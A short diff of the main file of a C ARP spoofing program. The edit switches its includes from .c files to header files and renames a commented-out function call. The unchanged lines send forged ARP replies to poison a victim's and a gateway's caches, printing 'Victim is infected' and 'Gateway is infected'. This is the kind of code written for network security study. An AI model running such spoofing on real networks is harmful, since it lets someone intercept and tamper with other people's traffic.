@@ -8,11 +8,11 @@
 #include <net/if_arp.h>
 #include <string.h>
 
-#include "get_network_info.c"
-#include "arp_request.c"
-#include "send_arp.c"
-#include "send_arp_for_all_user.c"
-#include "arp_spoofing.c"
+#include "get_network_info.h"
+#include "arp_request.h"
+#include "send_arp.h"
+#include "send_arp_for_all_user.h"
+#include "arp_spoofing.h"
 
 int main(int argc, char *argv[])
 {
@@ -60,7 +60,7 @@ int main(int argc, char *argv[])
 	send_arp(handle, &dlghwns817_mac, &alonso_mac, &gateway_ip, &dlghwns817_ip);
 	printf("Victim is infected!!!\n\n");
 	
-	//send_arp2(handle, &alonso_mac, &gateway_ip);
+	//send_arp_for_all_user(handle, &alonso_mac, &gateway_ip);
 	
 	send_arp(handle, &gateway_mac, &alonso_mac, &dlghwns817_ip, &gateway_ip);
 	printf("Gateway is infected!!!\n\n");
